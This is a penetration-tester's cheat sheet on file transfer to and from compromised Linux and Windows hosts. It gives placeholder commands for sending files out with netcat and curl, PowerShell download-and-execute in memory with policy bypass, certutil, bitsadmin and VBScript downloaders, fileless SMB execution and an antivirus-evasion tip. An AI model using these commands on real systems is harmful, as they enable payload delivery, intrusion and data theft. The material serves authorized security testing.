# General - File transfer

On Linux, it is recommended to verify the integrity of the transferred file
using the built-in `md5sum`.

On Windows, the PowerShell cmdlet `Get-FileHash -Algorithm MD5` can be used to
compute the MD5 file's hash.

### Server side

The following tools can be used to host files server side.

###### [Linux / Windows] Python - Web Server

```python
python -m SimpleHTTPServer <PORT>
```

###### [Linux] curl

```bash
# Needs the receiver to be listening
curl -F 'data=@<FILE>' http://<IP>:<PORT>
```

###### [Linux / Windows] nc

```
# Needs the receiver to be listening
nc -w 3 <IP> <PORT> < <FILE>

Get-Content <FILE> | ./nc.exe -w 3 <IP> <PORT>
```

###### [Linux] impacket-smbserver

```bash
impacket-smbserver <SHARE_NAME> <SHARE_PATH>

impacket-smbserver <SHARE_NAME> `pwd`
```

###### [Windows] GUI shares

On Windows, the graphical interface can be used to share a specific folder over
the network. Sharing a folder requires Administrator or SYSTEM privileges.

Note that the final access permissions for a shared resource are determined by
considering both the NTFS permissions and the sharing protocol permissions, and
then applying the more restrictive permissions. Thus, it is possible to grant
"Everyone" full access permission when configuring the share permissions.

```
# Share permissions
Right click folder -> Properties -> Sharing -> Share -> Everyone

# NTFS permissions - Needs to be applied to the folder and its files
Right click folder -> Properties -> Security -> Edit -> Add
  -> From this location -> <DOMAIN>
  -> Enter the object names to select -> <USERNAME> (-> Check Names)
```

###### [Linux / Windows] FTP

```
# pip install pyftpdlib
python -m pyftpdlib -w -p <PORT>
```

###### [Linux / Windows] TFTP

```
# Metasploit server module
use auxiliary/server/tftp

# Unix daemon
mkdir <TFTPFOLDER>
atftpd --daemon --port <PORT> <TFTPFOLDER>
```

### Client side

The following tools can be used to download file from a server client side.  

File transfer is easier on Linux machines as `wget`, `curl` or `netcat` are
often packaged with the operating system distribution.  

On Windows machines, the process is usually not as straight forward but
multiples methods can still be used. Transferring the `netcat` utility may
simplify the subsequent files transfer.  

The most reliable tools and methods are presented below. For a more exhaustive
list of tools that can be used to transfer files on and off a Windows machine,
refer to `https://lolbas-project.github.io/#/download`.

###### [Linux / Windows] echo & base64 encoding

The Linux built-ins `echo` and `base64` and the Windows CMD built-ins `echo` and
`certutil` can be used to easily transfer files on Linux / Windows systems.   

Encode the file to be transferred using base64 server-side, copy it to the
clipboard buffer, and decode it into a file client-side.   

```
# Server-side (Linux)
base64 -w 0 <FILE> | xclip -selection clipboard

# Server-side (Windows). Newlines can be trimmed on Linux using sed.
certutil -encode <FILE> tmp_file_base64.txt
sed ':a;N;$!ba;s/\n//g' file

# Client-side - Linux
echo '<BASE64_FILECONTENT>' | base64 --decode > <OUTPUT_FILE>

# Client-side - Windows
echo <BASE64_FILECONTENT> > tmp_file_base64.txt
certutil -decode tmp_file_base64.txt <OUTPUT_FILE>
# del tmp_file_base64.txt
```

###### [Linux] wget

```bash
wget <URL>
wget http:/<IP>:<PORT>/<FILE>
wget -O <OUTPUT_FILE> http://<IP>:<PORT>t/<FILE>
wget -r --no-parent -nH --reject "index.html*" http://<IP>:<PORT>/<DIR>
```

###### [Linux] curl

```bash
curl <URL> > <OUTPUT_FILE>
curl http://<IP>:<PORT>/<FILE> > <OUTPUT_FILE>
curl -O http://<IP>:<PORT>/<FILE>
```

###### [Linux / Windows] netcat

```bash
nc -lvnp <PORT> > <OUTPUT_FILE>
nc -lvnp <PORT> | tee <OUTPUT_FILE>
```

###### [FreeBSD] fetch

The FreeBSD built-in `fetch` can be used to retrieve a file by URL:

```
fetch <URL>
fetch -o <OUTPUT_FILE> http://<IP>:<PORT>/<FILE>
```

###### [Linux / Windows] Python

```python
python -c "from urllib import urlretrieve; urlretrieve('http://<IP>:<PORT>/<FILE>', '<OUTPUT_FILE>')"
python3 -c "from urllib.request import urlretrieve; urlretrieve('http://<IP>:<PORT>/<FILE>', '<OUTPUT_FILE>')"
```

###### [Linux / Windows] Perl

```perl
perl -le "use File::Fetch; my $ff = File::Fetch->new(uri => 'http://<IP>:<PORT>/<FILE>'); my $file = $ff->fetch() or die $ff->error;"
```

###### [Windows] Powershell

The PowerShell cmdlets `Invoke-WebRequest`, `DownloadFile` and `New-PSDrive`
can be used to download files from a remote web service or SMB share.

```powershell
Invoke-WebRequest -Uri <URL> -OutFile <OUTPUT_FILE>
(New-Object Net.WebClient).DownloadFile('http://<IP>:<PORT>/<FILE>', '<FULLPATH\FILENAME>');

# Load in memory and execute
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/<FILE>'); Invoke-ImportedCMD"
echo IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/<FILE>') | powershell -nop -exec bypass -

# Connect to a SMB share
New-PSDrive -Name "LocalMountedFolder" -PSProvider "FileSystem" -Root "\\<IP>\<SHARE>"; cd LocalMountedFolder:
```

###### [Windows] VBScript

`VBScript`, a Microsoft scripting language modeled on Visual Basic, can be used
to transfer files (although larger files > 2MB tend to pose problem).

As the execution of VBScript may be restricted by GPO, the first step is to make
sure VBScript can be used on the compromised machine:

```
echo WScript.StdOut.WriteLine "Successfully ran VBScript!" > test.vbs

cscript test.vbs
```

If `Successfully ran VBScript!` is printed on the console screen, VBScript can
be executed on the target. On the contrary, if any of the following error
messages is displayed, the usage of VBScript is restricted:

```
This program is blocked by group policy. For more information, contact your system administrator.
Access is denied.
```

The following CMD commands can be used to create a VBScript downloader
(courtesy of @frizb):

```
# =< Windows 8 / Windows Server 2012
echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs & echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs & echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs

# Windows 10 / Windows Server 2016
echo dim xHttp: Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs &echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs &echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs
```

The VBScript can then be used to download files on the target:

```
cscript dl.vbs "http://<IP>:<PORT>/<FILE>" ".\<FILENAME>"
```

###### [Windows] SMB shares

SMB shares can be accessed and mounted using the Windows `net` command-line
utility . Once mounted the drive can be accessed as a local drive.

The most interesting feature of using SMB is the fact that files
can be directly executed over the SMB Share without the needed to write them
to the target machine file system, effectively resulting in file less execution.

```
# Confirm the SMB share is accessible
net view \\<HOSTNAME | IP>\<SHARE_NAME>

# Direct execution through CMD shell
\\<HOSTNAME | IP>\<SHARE_NAME>\<FILE>

# Mount the share to the S: drive
net use S: \\<HOSTNAME | IP>\<SHARE_NAME>
net use S: \\<HOSTNAME | IP>\<SHARE_NAME> /user:<DOMAIN>\<USERNAME> <PASSWORD>

# Direct access without mounting
dir \\<HOSTNAME | IP>\<SHARE_NAME>
copy \\<HOSTNAME | IP>\<SHARE_NAME>\<FILE> .
```

###### [Windows] BITSAdmin

`BITSAdmin` is a Windows command-line tool that can be uses to create download
or upload files.

```
bitsadmin /transfer job http://<IP>:<PORT>/<FILE> <OUTPUT_FILE_PATH>
```

###### [Windows] CertUtil

`CertUtil` is a Windows command-line tool designed to manage Certification
Authority (CA) and certificates. One of its feature is the ability to download
files from a remote URL.

```
certutil -urlcache -split -f http://<IP>:<PORT>/<FILE> <FILENAME>
```

###### [Windows] findstr

`findstr` is a Windows utility used for searching patterns of text in files.

The following command can be used to search the string DoNotExist123456789 in
the specified remote file and, since it does not exist (/V), download it.

```
findstr /V /L DoNotExist123456789 \\<HOSTNAME | IP>\<SHARE_NAME>\<FILE> > <OUTPUT_FILE_PATH>
```

###### [Linux / Windows] FTP

To download file interactively:

```
ftp -A <SERVERIP>
```

Paste the following commands into a remote Windows shell and download files
over FTP non-interactively (replace <USERNAME> by anonymous if using anonymous
login):

```
# Windows
echo open <IP> <PORT> > ftp.txt
echo USER <USERNAME> >> ftp.txt
echo PASS <PASSWORD> >> ftp.txt
echo bin >> ftp.txt
echo GET <FILENAME> >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```

In case of AV errors while trying to download a binary, omit the exe extension.  

###### [Windows XP & 2003] TFTP

TFTP is a simple protocol for transferring files, implemented on top of the
UDP/IP protocols. TFTP was designed to be small and easy to implement, and
therefore it lacks most of the advanced features offered by more robust file
transfer protocols.
TFTP only reads and writes files from or to a remote server. It cannot list,
delete, or rename files or directories and it has no provisions for user
authentication.  

Windows operating systems up to Windows XP and 2003 contain a TFTP
client, by default. In Windows 7, 2008, and above, this tool needs to be
explicitly added, during installation.

```
tftp -i <SERVERIP> GET <FILENAME>
```

###### [Linux] SCP

The Linux `Secuyre Copy` utility can be used to transfer files over SSH and
can notably be used to retrieve and upload files from a compromised target
exposing a SSH service.  

```
# Download remote <FILENAME> from <HOSTNAME | IP>
scp <USERNAME>@<HOSTNAME | IP>:<DIRECTORY>/<FILENAME>
scp -i <KEY> <USERNAME>@<HOSTNAME | IP>:<DIRECTORY>/<FILENAME>

# Upload <LOCAL_FILENAME> to <HOSTNAME | IP>
scp <LOCAL_FILENAME> <USERNAME>@<HOSTNAME | IP>:<DIRECTORY>/<FILENAME>
scp -i <KEY> <LOCAL_FILENAME> <USERNAME>@<HOSTNAME | IP>:<DIRECTORY>/<FILENAME>
```

###### [Linux / Windows] Metasploit meterpreter

The `Metasploit` `meterpreter` commands `download` and `upload` can be used to
download / upload a specific file or to recursively download / upload
directories and their contents.

```
meterpreter> download <FILENAME>
meterpreter> download -r <DIRECTORY>

meterpreter> upload <FILENAME>
meterpreter> upload -r <DIRECTORY>
```
